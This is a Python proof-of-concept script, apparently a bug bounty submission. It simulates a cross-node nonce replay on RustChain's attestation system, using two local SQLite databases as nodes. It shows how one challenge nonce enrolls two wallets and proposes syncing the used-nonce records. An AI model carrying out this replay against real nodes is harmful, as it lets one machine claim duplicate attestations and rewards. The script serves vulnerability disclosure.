#!/usr/bin/env python3
"""
PoC: Cross-Node Attestation Nonce Replay Attack
================================================

Bounty #2296: Red Team Attestation Replay Cross-Node Attack

Simulates the attack where a nonce consumed on Node A is replayed 
to Node B before the cross-node sync propagates the consumption record.

Attack window: 30 seconds (rip_node_sync.py SYNC_INTERVAL)

Root Cause:
-----------
The `used_nonces` table in each node's SQLite database is NOT synchronized
across the network. The rip_node_sync.py service only syncs the 
`miner_attest_recent` table (attestations), not the `used_nonces` table.

This means each node is a local authority on which nonces it has consumed,
but there is no global registry. An attacker can exploit this by:
1. Getting a valid attestation nonce from Node A
2. Submitting the same nonce to Node B (which has no record of it)
3. Both nodes accept the same nonce for different wallets

Usage:
    python3 poc_cross_node_nonce_replay.py

No external dependencies required (uses stdlib only).
"""

import sqlite3
import time
import secrets
import hashlib
import os
import tempfile
from typing import Tuple

# =============================================================================
# Configuration
# =============================================================================

NODE_A_DB = tempfile.mktemp(suffix="_node_a.db")
NODE_B_DB = tempfile.mktemp(suffix="_node_b.db")
ATTESTATION_TTL = 600
ATTEST_NONCE_SKEW_SECONDS = 60
CHALLENGE_TTL = 300

# =============================================================================
# Shared Challenge Issuer
# =============================================================================

class ChallengeIssuer:
    """
    Simulates the /attest/challenge endpoint.
    
    In the real system, challenge nonces are issued by each node independently.
    For this PoC, we simulate a shared issuer to demonstrate that even with 
    globally unique nonces, the cross-node replay is possible because each node's
    used_nonces table is independent.
    """
    
    def __init__(self):
        self.issued_challenges = {}  # nonce -> expires_at
    
    def issue(self) -> Tuple[str, int]:
        """Issue a new challenge nonce (simulates POST /attest/challenge)"""
        nonce = secrets.token_hex(32)  # 64 hex chars = 256-bit random
        expires_at = int(time.time()) + CHALLENGE_TTL
        self.issued_challenges[nonce] = expires_at
        return nonce, expires_at
    
    def validate_and_consume(self, nonce: str, now_ts: int) -> bool:
        """Validate challenge exists and hasn't expired, then consume it"""
        if nonce not in self.issued_challenges:
            return False
        if self.issued_challenges[nonce] < now_ts:
            return False  # expired
        del self.issued_challenges[nonce]
        return True

# =============================================================================
# Node Simulator
# =============================================================================

class NodeSimulator:
    """
    Simulates a single RustChain node's attestation state.
    
    Key tables (per node, LOCAL ONLY):
    - used_nonces: Stores consumed nonces (NOT synced by rip_node_sync)
    - nonces: Issued challenges (NOT synced)
    - miner_attest_recent: Attestations (SYNCED by rip_node_sync)
    - hardware_bindings: Hardware binding records (NOT synced)
    
    The vulnerability: used_nonces is local, not synced.
    """

    ATTEST_NONCE_SKEW_SECONDS = 60
    
    def __init__(self, name: str, db_path: str, challenge_issuer: ChallengeIssuer):
        self.name = name
        self.db_path = db_path
        self.challenge_issuer = challenge_issuer
        self._init_db()
    
    def _init_db(self):
        """Initialize the node's SQLite database"""
        conn = sqlite3.connect(self.db_path)
        conn.execute("""CREATE TABLE IF NOT EXISTS nonces 
            (nonce TEXT PRIMARY KEY, expires_at INTEGER)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS used_nonces 
            (nonce TEXT PRIMARY KEY, miner_id TEXT NOT NULL, first_seen INTEGER NOT NULL, expires_at INTEGER NOT NULL)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS miner_attest_recent 
            (miner TEXT PRIMARY KEY, ts_ok INTEGER, device_arch TEXT)""")
        conn.execute("""CREATE TABLE IF NOT EXISTS hardware_bindings 
            (hardware_id TEXT PRIMARY KEY, bound_miner TEXT)""")
        conn.commit()
        conn.close()
    
    def get_challenge(self) -> str:
        """
        Simulate POST /attest/challenge
        
        Returns a 64-hex challenge nonce that can be used for attestation.
        """
        nonce, expires_at = self.challenge_issuer.issue()
        conn = sqlite3.connect(self.db_path)
        conn.execute("INSERT INTO nonces (nonce, expires_at) VALUES (?, ?)", (nonce, expires_at))
        conn.commit()
        conn.close()
        return nonce
    
    def _compute_hardware_id(self, miner: str, source_ip: str) -> str:
        """
        Compute hardware ID - mirrors the real implementation.
        
        In the real system (_compute_hardware_id in rustchain_v2_integrated_v2.2.1_rip200.py):
        hw_fields = [ip_component, model, arch, family, cores, mac_str, cpu_serial]
        
        For this PoC, we use a simplified version.
        """
        hw_str = f"{source_ip}|{miner}"
        return hashlib.sha256(hw_str.encode()).hexdigest()[:16]
    
    def _check_hardware_binding(self, miner: str, source_ip: str) -> Tuple[bool, str]:
        """
        Check if hardware is already bound to a different miner.
        Returns (allowed, reason).
        """
        hardware_id = self._compute_hardware_id(miner, source_ip)
        conn = sqlite3.connect(self.db_path)
        row = conn.execute("SELECT bound_miner FROM hardware_bindings WHERE hardware_id = ?", 
                         (hardware_id,)).fetchone()
        if row is None:
            conn.execute("INSERT INTO hardware_bindings VALUES (?, ?)", (hardware_id, miner))
            conn.commit()
            conn.close()
            return True, "ok"
        bound_miner = row[0]
        conn.close()
        if bound_miner == miner:
            return True, "ok"
        return False, f"hardware_already_bound_to_{bound_miner}"
    
    def submit_attestation(self, miner: str, nonce: str, source_ip: str) -> Tuple[bool, str]:
        """
        Simulate POST /attest/submit
        
        This function mirrors the real attestation submission flow:
        1. Check used_nonces for replay (LOCAL ONLY - the vulnerability)
        2. Validate challenge nonce
        3. Check hardware binding
        4. Record in used_nonces
        
        Returns (success, reason)
        """
        now_ts = int(time.time())
        
        conn = sqlite3.connect(self.db_path)
        
        # === Step 1: Check used_nonces for replay (LOCAL - THE VULNERABILITY) ===
        replay_row = conn.execute(
            "SELECT 1 FROM used_nonces WHERE nonce = ?", (nonce,)
        ).fetchone()
        if replay_row:
            conn.close()
            return False, "nonce_replay"
        
        # === Step 2: Validate challenge nonce ===
        row = conn.execute(
            "SELECT expires_at FROM nonces WHERE nonce = ?", (nonce,)
        ).fetchone()
        if row:
            if row[0] < now_ts:
                conn.close()
                return False, "challenge_expired"
            # Consume challenge (DELETE - single use)
            deleted = conn.execute(
                "DELETE FROM nonces WHERE nonce = ? AND expires_at = ?",
                (nonce, row[0])
            ).rowcount
            if deleted != 1:
                conn.close()
                return False, "challenge_invalid"
        
        conn.commit()
        
        # === Step 3: Check hardware binding ===
        conn.close()
        allowed, reason = self._check_hardware_binding(miner, source_ip)
        if not allowed:
            return False, reason
        
        # === Step 4: Record in used_nonces (LOCAL ONLY - NOT SYNCED) ===
        conn = sqlite3.connect(self.db_path)
        expires_at = now_ts + self.ATTEST_NONCE_SKEW_SECONDS
        conn.execute(
            "INSERT INTO used_nonces (nonce, miner_id, first_seen, expires_at) VALUES (?, ?, ?, ?)",
            (nonce, miner, now_ts, expires_at)
        )
        
        # Record attestation (this IS synced via rip_node_sync)
        conn.execute(
            "INSERT OR REPLACE INTO miner_attest_recent (miner, ts_ok) VALUES (?, ?)",
            (miner, now_ts)
        )
        conn.commit()
        conn.close()
        
        return True, "ok"
    
    def sync_attestations_from_peer(self, peer_node: 'NodeSimulator'):
        """
        Simulate rip_node_sync.py sync of miner_attest_recent.
        
        CRITICAL: This only syncs miner_attest_recent (attestations).
        The used_nonces table is NOT synced - this is the root cause.
        """
        conn_self = sqlite3.connect(self.db_path)
        conn_peer = sqlite3.connect(peer_node.db_path)
        
        # Sync attestations (but NOT used_nonces!)
        peer_atts = conn_peer.execute(
            "SELECT miner, ts_ok, device_arch FROM miner_attest_recent"
        ).fetchall()
        
        synced = 0
        for miner, ts_ok, device_arch in peer_atts:
            existing = conn_self.execute(
                "SELECT ts_ok FROM miner_attest_recent WHERE miner = ?", (miner,)
            ).fetchone()
            if not existing or ts_ok > existing[0]:
                conn_self.execute(
                    "INSERT OR REPLACE INTO miner_attest_recent (miner, ts_ok, device_arch) VALUES (?, ?, ?)",
                    (miner, ts_ok, device_arch)
                )
                synced += 1
        
        conn_self.commit()
        conn_peer.close()
        conn_self.close()
        
        return synced
    
    def get_used_nonces_count(self) -> int:
        """Get count of used nonces (local only)"""
        conn = sqlite3.connect(self.db_path)
        count = conn.execute("SELECT COUNT(*) FROM used_nonces").fetchone()[0]
        conn.close()
        return count
    
    def get_attestations(self) -> list:
        """Get current attestations"""
        conn = sqlite3.connect(self.db_path)
        atts = conn.execute("SELECT miner, ts_ok FROM miner_attest_recent").fetchall()
        conn.close()
        return [(m, t) for m, t in atts]
    
    def get_state_summary(self) -> dict:
        """Get node state summary for reporting"""
        return {
            "name": self.name,
            "used_nonces_count": self.get_used_nonces_count(),
            "attestations": self.get_attestations()
        }

# =============================================================================
# Attack Simulation
# =============================================================================

def print_separator(title: str):
    print(f"\n{'=' * 70}")
    print(f" {title}")
    print('=' * 70)


def run_attack_simulation():
    """
    Run the cross-node nonce replay attack simulation.
    """
    
    print_separator("Cross-Node Attestation Nonce Replay - PoC Simulation")
    print("\nTarget: RustChain multi-node attestation system")
    print("Vulnerability: used_nonces table not synchronized across nodes")
    print("Attack Window: Up to SYNC_INTERVAL (default 30 seconds)")
    
    # Cleanup old DBs if present
    for db_path in [NODE_A_DB, NODE_B_DB]:
        try:
            os.unlink(db_path)
        except FileNotFoundError:
            pass
    
    # Setup: Single shared challenge issuer (simulates the network)
    # In reality, each node issues its own challenges, but the attack
    # works the same way - the key is that used_nonces is per-node.
    issuer = ChallengeIssuer()
    
    # Create two node simulators
    node_a = NodeSimulator("Node-A (50.28.86.131)", NODE_A_DB, issuer)
    node_b = NodeSimulator("Node-B (50.28.86.153)", NODE_B_DB, issuer)
    
    wallet_a = "wallet-legit"      # Legitimate wallet
    wallet_b = "wallet-attacker"   # Attacker's second wallet
    attacker_ip_a = "203.0.113.50"  # Attacker IP as seen by Node A
    attacker_ip_b = "203.0.113.50"  # Same IP as seen by Node B (if same NAT)
    
    print(f"\n[SETUP]")
    print(f"  Attacker controls: {wallet_a} (legit) and {wallet_b} (malicious)")
    print(f"  Attacker IP: {attacker_ip_a}")
    print(f"  Node A: {node_a.name}")
    print(f"  Node B: {node_b.name}")
    
    # =========================================================================
    # PHASE 1: Legitimate enrollment on Node A
    # =========================================================================
    print_separator("PHASE 1: Legitimate Enrollment on Node A")
    
    nonce_for_wallet_a = node_a.get_challenge()
    print(f"\n[ACTION] Get challenge nonce from Node A")
    print(f"  Nonce: {nonce_for_wallet_a[:32]}... (full: {len(nonce_for_wallet_a)} hex chars)")
    
    print(f"\n[ACTION] Submit attestation for {wallet_a}")
    success, reason = node_a.submit_attestation(wallet_a, nonce_for_wallet_a, attacker_ip_a)
    print(f"  Result: {'✓ SUCCESS' if success else '✗ FAILED: ' + reason}")
    
    state_a = node_a.get_state_summary()
    print(f"\n  Node A State After Enrollment:")
    print(f"    used_nonces entries: {state_a['used_nonces_count']}")
    print(f"    attestations: {state_a['attestations']}")
    
    if not success:
        print("\n  Legitimate enrollment failed - aborting attack simulation.")
        return False
    
    # =========================================================================
    # PHASE 2: Cross-Node Replay Attack on Node B
    # =========================================================================
    print_separator("PHASE 2: Cross-Node Replay Attack on Node B")
    
    print(f"\n[ATTACK] Attempting to replay the SAME nonce to Node B")
    print(f"  Nonce: {nonce_for_wallet_a[:32]}... (already consumed on Node A)")
    print(f"  Target wallet: {wallet_b} (different from wallet_a)")
    print(f"  Target IP: {attacker_ip_b}")
    
    print(f"\n[CHECK] Node B's used_nonces BEFORE attack:")
    state_b_before = node_b.get_state_summary()
    print(f"  used_nonces entries: {state_b_before['used_nonces_count']}")
    print(f"  attestations: {state_b_before['attestations']}")
    
    print(f"\n[ATTACK] Submitting attestation with replayed nonce to Node B...")
    success_attack, reason_attack = node_b.submit_attestation(wallet_b, nonce_for_wallet_a, attacker_ip_b)
    print(f"  Result: {'✓ SUCCESS - ATTACK WORKS!' if success_attack else '✗ FAILED: ' + reason_attack}")
    
    state_b_after = node_b.get_state_summary()
    print(f"\n[CHECK] Node B's used_nonces AFTER attack:")
    print(f"  used_nonces entries: {state_b_after['used_nonces_count']}")
    print(f"  attestations: {state_b_after['attestations']}")
    
    # =========================================================================
    # PHASE 3: Verify Attack Impact
    # =========================================================================
    print_separator("PHASE 3: Attack Impact Verification")
    
    if success_attack:
        print("\n  ✓ ATTACK SUCCEEDED!")
        print(f"  ✓ Same challenge nonce consumed on BOTH nodes")
        print(f"  ✓ {wallet_a} enrolled on Node A")
        print(f"  ✓ {wallet_b} enrolled on Node B")
        print(f"  ✓ Attacker now has TWO attestations from ONE hardware")
        
        print(f"\n  Attack Analysis:")
        print(f"    - Nonce was cryptographically valid (issued by issuer)")
        print(f"    - Nonce was NOT in Node B's used_nonces (local to Node A)")
        print(f"    - Node B's hardware binding check passed (different binding per node)")
        print(f"    - The 'nonce_replay' check in attest_validate_and_store_nonce")
        print(f"      only queries the LOCAL used_nonces table")
    else:
        print(f"\n  ✗ ATTACK FAILED: {reason_attack}")
    
    # =========================================================================
    # PHASE 4: Demonstrate Sync Doesn't Fix It
    # =========================================================================
    print_separator("PHASE 4: Cross-Node Sync Analysis")
    
    print(f"\n[SYNC] Simulating rip_node_sync from Node A → Node B...")
    synced_count = node_b.sync_attestations_from_peer(node_a)
    print(f"  Synced {synced_count} attestation(s) from Node A to Node B")
    print(f"  Note: rip_node_sync only syncs miner_attest_recent")
    print(f"        The used_nonces table is NEVER synced!")
    
    print(f"\n[CHECK] Node B's used_nonces after sync:")
    state_b_sync = node_b.get_state_summary()
    print(f"  used_nonces entries: {state_b_sync['used_nonces_count']}")
    print(f"  attestations: {state_b_sync['attestations']}")
    
    print(f"\n[CONCLUSION] Cross-node sync does NOT prevent this attack!")
    print(f"  The used_nonces table must be synchronized between nodes")
    print(f"  OR the nonce replay check must query a shared/global registry")
    
    # Cleanup
    for db_path in [NODE_A_DB, NODE_B_DB]:
        try:
            os.unlink(db_path)
        except:
            pass
    
    return success_attack


# =============================================================================
# Main
# =============================================================================

if __name__ == "__main__":
    print("\n" + "=" * 70)
    print(" RustChain Attestation System - Cross-Node Replay Attack PoC")
    print("=" * 70)
    print("\nThis PoC demonstrates that the used_nonces table is NOT synchronized")
    print("between RustChain nodes, allowing nonce replay across nodes.")
    print("\nPrerequisites for real attack:")
    print("  1. Attacker controls ≥2 wallets")
    print("  2. Attacker can make HTTP requests to ≥2 RustChain nodes")
    print("  3. Attack executed within SYNC_INTERVAL (default 30 seconds)")
    print("  4. Attacker controls hardware or can bind hardware to multiple wallets")
    
    print("\n" + "-" * 70)
    
    attack_worked = run_attack_simulation()
    
    print("\n" + "=" * 70)
    if attack_worked:
        print(" CONCLUSION: VULNERABILITY CONFIRMED")
        print(" Cross-node nonce replay is exploitable!")
        print(" The used_nonces table must be synchronized between nodes.")
    else:
        print(" CONCLUSION: Attack simulation did not succeed")
    print("=" * 70 + "\n")
